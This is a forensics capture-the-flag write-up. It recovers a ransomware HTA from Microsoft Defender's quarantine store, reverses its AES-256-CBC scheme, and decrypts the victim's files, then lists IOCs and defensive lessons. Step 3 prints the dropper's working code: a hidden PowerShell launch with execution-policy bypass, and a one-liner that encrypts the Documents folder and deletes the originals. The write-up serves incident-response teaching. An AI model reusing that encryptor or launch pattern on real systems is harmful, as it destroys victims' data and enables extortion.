# Qfact — Forensics

**Event:** Black Hat MEA CTF Qualification 2026
**Category:** Forensics / DFIR
**Flag:** `BHFlagY{d3f3nd3r_qu4r4nt1n3_r3c0v3ry_2026}`

---

## Challenge brief

> A finance employee's workstation was hit by ransomware. All documents were encrypted and a
> ransom note was left demanding payment in Bitcoin. The employee recalls opening a file they
> received via email. IT later removed some Defender exclusions during a security audit, and
> Defender flagged a suspicious file, but it was quarantined, not preserved on disk. A triage
> package has been collected. Recover the malicious file, figure out how the encryption works,
> and decrypt the affected files.

The wording is the whole roadmap. The malware is *not* on disk — the only copy left anywhere on
the system is the one Microsoft Defender obfuscated and filed away in its quarantine store. So
the challenge is really three problems stacked:

1. Reverse Defender's quarantine container format to get the sample back.
2. Reverse the sample to recover the key schedule.
3. Reconstruct the key and IV from host artefacts and decrypt.

---

## Evidence

| | |
|---|---|
| Archive | `Evidence.zip` |
| Size | 35,788,227 bytes |
| MD5 | `d93b512cf6437220e8a55553fba57f83` |
| SHA-256 | `e4281b854b50995bbb3b88b081ce81105a60c159737632791f2ade8e37f1259c` |

```
EncryptedFiles/          9 × *.enc  (Financial, Personal, Projects, Reports)
EventLogs/               Application, Defender-Operational, PowerShell-Operational,
                         Security, System, TerminalServices  (.evtx)
Prefetch/                289 files, incl. MSHTA.EXE and 2 × POWERSHELL.EXE
Quarantine/
  Entries/{8003AEBB-0000-0000-8783-FBD9AB0CEF04}      396 B
  Resources/36/367F0894EA48CC0D7EFC919C5665F0E92D52352D    108 B
  ResourceData/36/367F0894EA48CC0D7EFC919C5665F0E92D52352D  4,769 B
Registry/                NTUSER.DAT, SOFTWARE, SYSTEM
READ_ME.txt              ransom note (UTF-16LE + BOM)
```

> **Two notes on extraction.**
> 1. The zip stores several entries with no owner read bit, so the quarantine blobs come out
>    unreadable. Run `chmod -R u+rwX` after unzipping, or the next step fails with
>    `PermissionError` rather than anything meaningful.
> 2. Paths use Windows backslash separators, so `unzip` prints
>    `appears to use backslashes as path separators`. Recent macOS/Info-ZIP builds still
>    create the directory tree correctly; if yours instead produces single files with literal
>    backslashes in the name, extract with `7z x` or Python's `zipfile` instead.

---

## Step 1 — Triage the ransom note

`READ_ME.txt` is UTF-16LE. Beyond the usual theatre it leaks one genuinely load-bearing fact:

```
Your Unique ID: LOCK-DESKTOP-KLPAT9O-JM-20260628-7F3A
```

Also recorded: BTC address `bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh` and the onion
`http://drkx7fq2cym3oa4rg6mv3wqj5hk2oiq4au.onion/recover`.

The ID is clearly `LOCK-<something>-<something>-<date>-<constant>`. Hold that thought — once
we have the dropper we will see the exact expression that built it, and it hands us half of
the IV.

---

## Step 2 — Understand the Defender quarantine store

Everything under `%ProgramData%\Microsoft\Windows Defender\Quarantine\` is obfuscated with
**RC4 under a static 256-byte key** compiled into `mpengine.dll`. It is not a secret and has
not changed in years; the same key is in `defender-dump`, `quarantine.py` and every other
public tool. It is reproduced in
[`solve/extract_quarantine.py`](solve/extract_quarantine.py).

Three directories matter:

| Directory | Holds |
|---|---|
| `Entries\{GUID}` | detection metadata: threat name, timestamp, original path |
| `ResourceData\XX\<SHA1>` | the quarantined file itself, wrapped in a container |
| `Resources\XX\<SHA1>` | a small back-reference record |

### 2a. `ResourceData` — one clean RC4 stream

Decrypting the whole 4,769-byte blob as a single RC4 stream immediately yields structure:

```
00000000  03 00 00 00  02 00 00 00  ac 00 00 00  00 00 00 00
00000010  01 00 04 84 ...                      <- SECURITY_DESCRIPTOR, 0xAC bytes
000000c0  01 00 00 00 00 00 00 00  79 11 00 00 00 00 00 00
000000d0  00 00 00 00  3c 68 74 6d 6c 3e 0d 0a  <- "<html>" starts at 0xD4
```

Layout:

| Offset | Field |
|---|---|
| `0x00` | version `3` |
| `0x04` | section count `2` |
| `0x08` | security-descriptor length (`0xAC`) |
| `0x10` | the security descriptor |
| *(aligned to 8)* `0xC0` | stream count (QWORD, `1`) |
| `0xC8` | stream length (QWORD, `0x1179` = 4,473) |
| `0xD0` | stream-name length (DWORD, `0`) |
| `0xD4` | **the original file** |

**Sanity check.** Defender names the file after a SHA-1. It does *not* match the payload here —
it matches the **decrypted container**:

```
SHA1(decrypted blob) = 367F0894EA48CC0D7EFC919C5665F0E92D52352D  == the filename
```

That single equality proves the RC4 key, the keystream alignment and the decryption are all
correct before a single byte of malware is interpreted. Worth doing every time.

### 2b. `Entries` — three *independent* RC4 streams

This is the part that trips people up. Decrypt the 396-byte entry as one stream and only the
first 0x30 bytes come out sane; everything after is noise. The file is **three separate RC4
streams laid end to end, each restarting the keystream from byte 0**:

```
[ 0x00 .. 0x3C )   header      -> lengths of the next two sections live at +0x28 / +0x2C
[ 0x3C .. 0x84 )   section 1   -> 0x48 bytes : GUID, FILETIME, threat name
[ 0x84 .. 0x18C )  section 2   -> 0x108 bytes: original path(s), UTF-16LE
```

Decrypted section 1:

```
0000  bb ae 03 80 00 00 00 00 87 83 fb d9 ab 0c ef 04   <- {8003AEBB-...-FBD9AB0CEF04}
0020  56 c3 d4 5f dc 06 dd 01                           <- FILETIME
0030  01 00 00 00 54 72 6f 6a 61 6e 3a 4a 53 2f 46 6c   ....Trojan:JS/Fl
0040  61 66 69 73 69 2e 43 00                           afisi.C.
```

Section 2 gives `\\?\C:\DevTools\Q3_Financial_Review.hta`.

```
$ python3 solve/extract_quarantine.py Evidence/Quarantine -o recovered/
[entry] {8003AEBB-0000-0000-8783-FBD9AB0CEF04}
        threat      : Trojan:JS/Flafisi.C
        quarantined : 2026-06-28 08:59:06.133384 UTC
        origin      : \\?\C:\DevTools\Q3_Financial_Review.hta
        origin      : C:\DevTools\Q3_Financial_Review.hta
[data ] 367F0894EA48CC0D7EFC919C5665F0E92D52352D
        container sha1 matches name : True
        payload size   : 4473
        payload md5    : 1a4803df55d66440858ce9699edf125b
        payload sha256 : 4f8fab2ca63a0313edf0a1190071d4d946cf0b90c27046e9fb9e5e84056145b0
```

**`C:\DevTools\`** — remember that path. It is exactly what the brief meant by "Defender
exclusions".

---

## Step 3 — The recovered sample

4,473 bytes of HTML Application. Full copy (defanged filename) in
[`artifacts/malware/`](artifacts/malware/).

The lure is a fake "Q3 Financial Review — Loading" page. The payload is in `Window_OnLoad`. It
builds its passphrase one character at a time — a token attempt to dodge string scanning:

```vbscript
k = Chr(70) & Chr(120) & Chr(55) & Chr(109) & Chr(75)   ' F x 7 m K
k = k & Chr(57) & Chr(118) & Chr(76) & Chr(50) & Chr(110) ' 9 v L 2 n
k = k & Chr(81) & Chr(52) & Chr(119) & Chr(80) & Chr(122) ' Q 4 w P z
k = k & Chr(33)                                            ' !
```

→ **`Fx7mK9vL2nQ4wPz!`**

It then concatenates a PowerShell one-liner and runs it hidden:

```vbscript
CreateObject("WScript.Shell").Run _
  "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command """ & ps & """", 0, True
window.setTimeout "window.close()", 3000
```

The interesting half of `$ps`:

```powershell
$ErrorActionPreference='SilentlyContinue';
$p='Fx7mK9vL2nQ4wPz!';
$d=[Environment]::GetFolderPath('MyDocuments');
$kb=[System.Text.Encoding]::UTF8.GetBytes($p.PadRight(32).Substring(0,32));
$ivSeed=$env:COMPUTERNAME+$env:USERNAME;
$md5=[Security.Cryptography.MD5]::Create();
$iv=$md5.ComputeHash([Text.Encoding]::UTF8.GetBytes($ivSeed));
gci $d -File -Recurse|%{
  $c=[IO.File]::ReadAllBytes($_.FullName);
  $a=[Security.Cryptography.Aes]::Create();
  $a.Key=$kb; $a.IV=$iv; $a.Mode=0; $a.Padding=2;
  $e=$a.CreateEncryptor();
  $enc=$e.TransformFinalBlock($c,0,$c.Length);
  [IO.File]::WriteAllBytes($_.FullName+'.enc',$enc);
  ri $_.FullName -Force; $a.Dispose()};
```

It also builds the ransom ID we saw in Step 1:

```powershell
$u='LOCK-'+$env:COMPUTERNAME+'-'+$env:USERNAME.Substring(0,2).ToUpper()+'-'+(Get-Date -Format 'yyyyMMdd')+'-7F3A'
```

and beacons the base64 IV to the onion over `Net.WebClient` inside a `try{}catch{}` — cosmetic
here, but it confirms the IV is host-derived rather than random.

---

## Step 4 — Recovering the key and IV

### The key

```
"Fx7mK9vL2nQ4wPz!".PadRight(32).Substring(0,32)
  = "Fx7mK9vL2nQ4wPz!" + 16 spaces        (16 chars + 16 × 0x20)
  = 4678376d4b39764c326e513477507a2120202020202020202020202020202020
```

A 32-byte key means **AES-256**. Note the sloppiness: 128 bits of the key are literally
`0x20` padding.

### The IV

```
iv = MD5(UTF8($env:COMPUTERNAME + $env:USERNAME))
```

Both values come straight out of the triage package:

* **`COMPUTERNAME`** — `DESKTOP-KLPAT9O`, from `SYSTEM\ControlSet001\Control\ComputerName`
  (and echoed all over the event logs).
* **`USERNAME`** — the ransom note only gives us `JM` (the dropper uppercases the first two
  characters). The SOFTWARE hive settles it: `ProfileList` carries `C:\Users\jmartin`.

```
MD5("DESKTOP-KLPAT9O" + "jmartin") = a31de3916e88f240c2bf08735b965aa9
```

### The mode — the actual trap

```powershell
$a.Mode=0
```

`0` is **not a valid `System.Security.Cryptography.CipherMode`** (CBC=1, ECB=2, OFB=3, CFB=4,
CTS=5). The property setter validates its input and throws. But the very first statement of
the script is `$ErrorActionPreference='SilentlyContinue'`, so the exception is swallowed, the
assignment never lands, **and the `Aes` object keeps its default mode — CBC.**

`$a.Padding=2` *is* valid and means PKCS7 (also the default).

So the real scheme is **AES-256-CBC + PKCS#7**, not ECB. Reading `Mode=0` as "no mode / ECB"
is the intended dead end — every file will fail to unpad.

Two independent confirmations that CBC is right:

* All 9 files carry valid PKCS#7 padding after CBC decryption. Under the wrong mode that is a
  ~1-in-256 accident per file, so 9-for-9 is conclusive.
* The plaintexts are coherent English/CSV, and the first block — the one CBC XORs with the IV
  — decrypts correctly, which only happens if the IV is right too.

---

## Step 5 — Decrypt

```
$ python3 solve/decrypt_files.py Evidence/EncryptedFiles -o decrypted/ \
      --computername DESKTOP-KLPAT9O --username jmartin
key (hex) : 4678376d4b39764c326e513477507a2120202020202020202020202020202020
iv  (hex) : a31de3916e88f240c2bf08735b965aa9   <- MD5('DESKTOP-KLPAT9Ojmartin')

[ ok ] Financial/Q3_auth_memo.txt.enc     ->  decrypted/Financial/Q3_auth_memo.txt     (1412 bytes)
[ ok ] Financial/Q3_forecast.csv.enc      ->  decrypted/Financial/Q3_forecast.csv      (2622 bytes)
[ ok ] Financial/budget_2025.csv.enc      ->  decrypted/Financial/budget_2025.csv      (1976 bytes)
[ ok ] Financial/vendor_payments.csv.enc  ->  decrypted/Financial/vendor_payments.csv  (3037 bytes)
[ ok ] Personal/notes.txt.enc             ->  decrypted/Personal/notes.txt              (100 bytes)
[ ok ] Projects/timeline.txt.enc          ->  decrypted/Projects/timeline.txt           (206 bytes)
[ ok ] Reports/budget_meeting.txt.enc     ->  decrypted/Reports/budget_meeting.txt      (242 bytes)
[ ok ] Reports/it_request.txt.enc         ->  decrypted/Reports/it_request.txt          (158 bytes)
[ ok ] Reports/standup_notes.txt.enc      ->  decrypted/Reports/standup_notes.txt       (250 bytes)

9/9 files recovered
```

`decrypt_files.py` uses a small dependency-free AES in
[`solve/miniaes.py`](solve/miniaes.py), so the writeup reproduces on a stock Python 3 with no
`pip install`. (Verified byte-identical to
`openssl enc -d -aes-256-cbc -K <key> -iv <iv>`.)

---

## Step 6 — The flag

`Financial/Q3_auth_memo.txt` is a fake CFO memo carrying a "master authorization code":

```
The master authorization code for the Q3 financial reporting
portal has been encoded below for secure internal transmission
per our data handling procedures:

QkhGbGFnWXtkM2YzbmQzcl9xdTRyNG50MW4zX3IzYzB2M3J5XzIwMjZ9
```

```
$ echo 'QkhGbGFnWXtkM2YzbmQzcl9xdTRyNG50MW4zX3IzYzB2M3J5XzIwMjZ9' | base64 -d
BHFlagY{d3f3nd3r_qu4r4nt1n3_r3c0v3ry_2026}
```

## `BHFlagY{d3f3nd3r_qu4r4nt1n3_r3c0v3ry_2026}`

---

## Corroboration — the incident timeline

None of the above needs the event logs, but they confirm every inference. Built with
[`solve/evtx_timeline.py`](solve/evtx_timeline.py), all times UTC.

| Time (UTC) | Source | EID | Event |
|---|---|---|---|
| 2026-06-26 16:59:33 | Defender | 5007 | Exclusion registered: `HKLM\...\Exclusions\Paths\C:\DevTools\` |
| 2026-06-28 08:08:40 | Defender | 5007 | Exclusion registered: `Exclusions\Processes\mshta.exe` |
| 2026-06-28 08:08:42 | Defender | 5007 | Exclusion registered: `Exclusions\Processes\powershell.exe` |
| 2026-06-28 08:10:00.943 | Security | 4688 | `"C:\Windows\SysWOW64\mshta.exe" "C:\DevTools\Q3_Financial_Review.hta"` — **parent `C:\Windows\explorer.exe`**, user `DESKTOP-KLPAT9O\jmartin` |
| 2026-06-28 08:10:01.506 | Security | 4688 | `powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command "$ErrorActionPreference=...` |
| 2026-06-28 08:10:03.122 | PowerShell | 4104 | Script-block logging captures the **full encryption one-liner in cleartext** |
| 2026-06-28 08:10:16.794 | Defender | 5007 | All three exclusion keys re-emitted — the security audit clearing them |
| 2026-06-28 08:58:33 | Defender | 1000 | Custom scan started: `file:_C:\DevTools\Q3_Financial_Review.hta` |
| 2026-06-28 08:58:34.407 | Defender | **1116** | Detection: `Trojan:JS/Flafisi.C`, ID 2147724987, Severe |
| 2026-06-28 08:59:06.133 | Defender | **1117** | Action taken: **Quarantine**, `0x00000000 The operation completed successfully` |

The narrative reads cleanly: `C:\DevTools\` was excluded two days before the attack, process
exclusions for `mshta.exe` and `powershell.exe` were added ~90 seconds before execution, the
user double-clicked the attachment out of Explorer, encryption ran, the audit stripped the
exclusions, and the next scan caught and quarantined the file — which is the only reason the
sample survived at all.

Defender build: `4.18.26050.15`, signatures `AV: 1.453.319.0`.
User SID: `S-1-5-21-311519456-2650088938-194008572-1001`.

**On the delivery vector.** `NTUSER.DAT` RecentDocs holds `Q3_Financial_Review.hta`, and
Outlook for Windows is installed, which is consistent with the emailed-attachment story — but
the mail item itself is not in the triage package, so the email is narrative rather than
something the evidence proves. The 4688 parent process (`explorer.exe`) does confirm a manual
double-click rather than automated execution.

Prefetch corroborates execution too (`MSHTA.EXE-854F6B45.pf`, two `POWERSHELL.EXE` entries),
though those files are MAM/Xpress-Huffman compressed and were not needed here.

---

## Indicators of compromise

| Type | Value |
|---|---|
| SHA-256 | `4f8fab2ca63a0313edf0a1190071d4d946cf0b90c27046e9fb9e5e84056145b0` |
| SHA-1 | `39b3b086f489431ac30b19c460fd04d2ec496628` |
| MD5 | `1a4803df55d66440858ce9699edf125b` |
| Path | `C:\DevTools\Q3_Financial_Review.hta` |
| Detection | `Trojan:JS/Flafisi.C` (2147724987) |
| BTC | `bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh` |
| C2 | `drkx7fq2cym3oa4rg6mv3wqj5hk2oiq4au.onion` (`/recover`, `/beacon`) |
| Ransom ID | `LOCK-DESKTOP-KLPAT9O-JM-20260628-7F3A` |
| Artefacts | `READ_ME.txt` in Documents and Desktop; `*.enc` under Documents |
| Exclusions | `Paths\C:\DevTools\`, `Processes\mshta.exe`, `Processes\powershell.exe` |

**ATT&CK:** T1566.001 (spearphishing attachment) → T1204.002 (user execution) →
T1218.005 (mshta) → T1059.001 (PowerShell) → T1562.001 (impair defenses / exclusions) →
T1486 (data encrypted for impact).

---

## Takeaways

**For the DFIR side.** Defender's quarantine is a *recovery mechanism*, not just a bin. When a
sample is "gone", `ResourceData` usually still has it byte-for-byte, and `Entries` still has
the original path and detection time. Both are one static RC4 key away. And always validate
the decrypt against the container's own SHA-1 filename before you trust anything downstream.

**For the crypto side.** `$a.Mode=0` is the whole puzzle. It is an invalid enum value, it
throws, `SilentlyContinue` hides the throw, and the default silently wins. Malware that looks
like it configured a cipher may not have configured anything — read what the runtime actually
does, not what the source appears to say. Then let padding validity across many files decide
it for you.

**For the defensive side.** Every control here worked *except* the exclusions. Path and
process exclusions for `C:\DevTools\`, `mshta.exe` and `powershell.exe` are a standing invitation;
ASR rules blocking `mshta.exe` child processes would have stopped this outright. Note also that
PowerShell script-block logging (4104) recorded the complete key material in cleartext — on a
real engagement that log alone gets the files back.

---

## Reproducing

```bash
unzip Evidence.zip -d Evidence
chmod -R u+rwX Evidence                      # zip stores some entries mode 000

cd solve
python3 extract_quarantine.py ../Evidence/Quarantine -o ../recovered
python3 decrypt_files.py ../Evidence/EncryptedFiles -o ../out \
        --computername DESKTOP-KLPAT9O --username jmartin
grep -o '[A-Za-z0-9+/=]\{40,\}' ../out/Financial/Q3_auth_memo.txt | base64 -d

# optional: rebuild the timeline
python3 evtx_timeline.py ../Evidence/EventLogs DevTools Flafisi Exclusion mshta Fx7mK9
```

No third-party packages required.

## Layout

```
solve/
  extract_quarantine.py   RC4 + Entries/ResourceData container parser
  decrypt_files.py        key/IV derivation + AES-256-CBC recovery
  miniaes.py              dependency-free AES-256-CBC (decrypt only)
  evtx_timeline.py        EVTX keyword timeline without python-evtx
artifacts/
  malware/                the recovered dropper (defanged filename) + notes
  decrypted/              all 9 recovered documents
  READ_ME.txt             ransom note, transcoded to UTF-8
```
